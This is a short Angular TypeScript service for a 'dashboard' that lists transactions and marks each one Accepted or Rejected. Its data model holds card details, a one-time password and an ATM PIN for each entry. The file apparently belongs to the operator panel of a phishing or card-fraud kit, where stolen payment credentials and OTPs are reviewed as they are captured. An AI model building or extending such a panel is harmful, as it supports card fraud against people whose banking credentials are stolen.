import { Injectable } from '@angular/core';
import { BaseApiService } from './base-api.service';
import { Observable, of } from 'rxjs';
import { delay } from 'rxjs/operators';

export interface Transaction {
  id: string;
  totalPrice: number;
  visaDetails: string;
  otp: string;
  atmPass: string;
  status: 'Pending' | 'Accepted' | 'Rejected';
}

@Injectable({
  providedIn: 'root'
})
export class DashboardService extends BaseApiService {
  private readonly baseUrl = '/dashboard/transactions';

  getTransactions(): Observable<Transaction[]> {
    return this.get<Transaction[]>(this.baseUrl);
  }

  updateTransactionStatus(id: string, status: 'Accepted' | 'Rejected'): Observable<{success: boolean}> {
    return this.put<{success: boolean}>(`${this.baseUrl}/${id}/status`, { status });
  }
}
